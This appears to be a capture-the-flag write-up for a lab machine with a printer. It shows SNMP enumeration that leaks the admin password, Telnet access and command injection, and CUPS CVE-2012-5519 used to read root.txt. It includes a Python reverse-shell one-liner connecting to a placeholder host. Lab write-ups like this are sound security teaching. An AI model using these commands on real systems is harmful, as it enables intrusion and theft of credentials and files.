## Initial Enumeration

A full TCP port scan was run to identify the services exposed on the target.

```bash
nmap 10.10.11.107 -Pn -sC -sV -p- --open -T4
```

The scan reveals a **Telnet** service, but authentication is not possible without valid credentials. A UDP scan was run next to look for additional services.

```bash
nmap 10.10.11.107 -sU --top-ports 20 -sV
```

This reveals an active **SNMP** service.

![SNMP service detected](/assets/images/antique/78-1.png)
*SNMP service detected*

## SNMP Enumeration

With SNMP exposed, `snmpwalk` was used to enumerate the information the service makes available.

```bash
snmpwalk -v 2c -c public 10.10.11.107
```

![SNMP enumeration](/assets/images/antique/78-2.png)
*Output returned by snmpwalk*

The device is a printer whose firmware is vulnerable to **Printer SNMP JetAdmin Device Password Disclosure** (**CVE-2002-1048**). The administrative password is stored in a specific SNMP variable, so querying that OID returns the password as a hexadecimal string.

```bash
snmpwalk -v 2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
```

Decoding the hexadecimal value recovers the plaintext password.

![Decoded SNMP password](/assets/images/antique/78-3.png)
*The hex value decoded back to the plaintext password*

## Initial Access

The recovered credentials are used to authenticate over Telnet and reach a command prompt.

![Authenticated prompt](/assets/images/antique/78-4.png)
*Authenticated session on the printer*

Testing the interface shows that it is vulnerable to **command injection**.

![Command injection](/assets/images/antique/78-5.png)
*Arbitrary command execution through the printer interface*

That injection point is leveraged to execute a reverse-shell payload:

```bash
exec python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

## Post-Exploitation & Tunneling

With a shell on the host, **linpeas** was run for local enumeration and flagged an internal service bound to a local-only port.

![Internal service](/assets/images/antique/78-6.png)
*A service listening only on localhost*

To reach that service from the attacking machine, an SSH tunnel was set up with **Chisel**.

![Chisel tunneling](/assets/images/antique/78-7.png)
*Forwarding the internal port over Chisel*

```bash
./chisel_1.7.7_linux_amd64 client <IP>:9000 R:9631:localhost:631
```

The forward exposes the internal web service locally.

![CUPS web interface](/assets/images/antique/78-8.png)
*The CUPS interface reachable through the tunnel*

## Privilege Escalation

The service is **CUPS 1.6.1**, which is vulnerable to [CVE-2012-5519](https://nvd.nist.gov/vuln/detail/CVE-2012-5519). The flaw lets members of the `lpadmin` group change the error-log path through `cupsctl`. The current user belongs to that group, so the log can be pointed at an arbitrary file.

```bash
lp@antique:~$ cupsctl ErrorLog="/root/root.txt"
```

Because CUPS reads back the error log as root, redirecting it at `root.txt` makes the file readable and yields the root flag.

![Root flag](/assets/images/antique/78-9.png)
*Reading root.txt through the redirected CUPS error log*
